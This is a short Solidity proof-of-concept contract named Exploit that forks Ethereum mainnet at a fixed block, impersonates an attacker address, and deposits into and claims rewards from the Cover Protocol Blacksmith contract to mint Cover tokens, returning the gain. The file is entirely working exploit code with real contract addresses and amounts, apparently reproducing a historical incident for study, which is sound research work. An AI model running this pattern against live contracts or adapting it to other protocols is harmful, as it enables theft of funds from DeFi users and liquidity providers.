// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
    function prank(address) external;
}

interface Blacksmith {
    function claimRewardsForPools(address[] calldata) external;
    function claimRewards(address) external;
    function deposit(address, uint256) external;
    function withdraw(address, uint256) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract Exploit {
    function run() external returns (uint256) {
        CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        cheat.createSelectFork("mainnet", 11542309);
        Blacksmith bs = Blacksmith(0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5);
        IERC20 bpt = IERC20(0x59686E01Aa841f622a43688153062C2f24F8fDed);
        IERC20 Cover = IERC20(0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286);
        address attacker = 0x00007569643bc1709561ec2E86F385Df3759e5DD;
        uint256 amount = 15255552810089260015361;
        uint256 balanceBefore = Cover.balanceOf(attacker);
        cheat.prank(attacker);
        bs.deposit(address(bpt), amount);
        cheat.prank(attacker);
        bs.claimRewards(address(bpt));
        uint256 balanceAfter = Cover.balanceOf(attacker);
        return balanceAfter - balanceBefore;
    }
}
